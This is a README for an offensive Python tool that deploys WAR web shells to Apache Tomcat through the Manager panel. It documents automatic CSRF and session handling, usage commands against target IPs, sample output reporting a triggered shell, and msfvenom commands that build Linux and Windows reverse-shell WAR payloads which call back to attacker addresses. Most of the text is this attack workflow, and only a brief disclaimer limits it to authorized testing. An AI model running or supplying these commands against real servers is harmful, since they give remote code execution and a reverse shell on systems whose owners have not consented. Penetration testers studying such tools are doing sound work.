![banner](img/my_script_shell.png)


# ☢️ Tomcat WAR File Uploader

A Python tool to upload `.war` web shells to Apache Tomcat via the Manager interface (`/manager/html`). Automatically handles CSRF protection and session cookies.
(Tested on Apache Tomcat/9.0.53)

## 🔧 Features

- Uploads WAR files to a Tomcat server
- Automatically extracts `JSESSIONID` and `CSRF_NONCE`
- Validates credentials before upload
- Triggers the uploaded shell if deployment succeeds

---

## 📦 Requirements

- Python 3.x
- `requests`
- `beautifulsoup4`

Install dependencies:

```bash
pip install -r requirements.txt
```

Or manually:

```bash
pip install requests beautifulsoup4
```

---

## 🚀 Usage

```bash
python3 tomcat_war_uploader.py --url http://<target>:8080 --username <user> --password <pass> --war-file shell.war
```

### Arguments

| Argument                  | Description                                                            |
|---------------------------|------------------------------------------------------------------------|
| `--url`                   | **(Required)** Base URL of the Tomcat server (e.g., `http://10.10.10.10:8080`) |
| `--username`              | **(Required)** Tomcat Manager username                                |
| `--password`              | **(Required)** Tomcat Manager password                                |
| `--war-file`              | WAR file to upload (default: `plugin.war`)                            |
| `--manager-panel`         | Manager panel path (default: `/manager/html`)                         |
| `--validate-credentials`  | Only validate credentials and exit (no upload)                        |

---

## 🧪 Examples

### Upload a WAR file

```bash
python3 tomcat_war_uploader.py --url http://10.10.10.10:8080 --username tomcat --password s3cret --war-file shell.war
```

### Validate credentials only

```bash
python3 tomcat_war_uploader.py --url http://10.10.10.10:8080 --username tomcat --password s3cret --validate-credentials
```
---

## ✅ Output

```text
[+] Parsed CSRF token: A1B2C3D4E5F6...
[+] War file uploaded successfully
[+] Shell triggered. Check your listener
```

---
---

## 🎯 Generating a Reverse Shell with `msfvenom`

You can generate a `.war` file payload using `msfvenom` for either Linux (JSP-based) or Windows (EXE wrapped as `.war`):

### 🔹 For Linux (JSP reverse shell):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.122 LPORT=443 -f war -o revshell.war
```

### 🔹 For Windows (EXE reverse shell wrapped in WAR):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > revshell.war
```

> ⚠️ For Windows payloads, make sure the target Tomcat server supports deploying `.exe` via WAR.

---


## ⚠️ Disclaimer

This script is intended for **educational and authorized security testing purposes only**. Do **not** use it against systems without explicit permission.
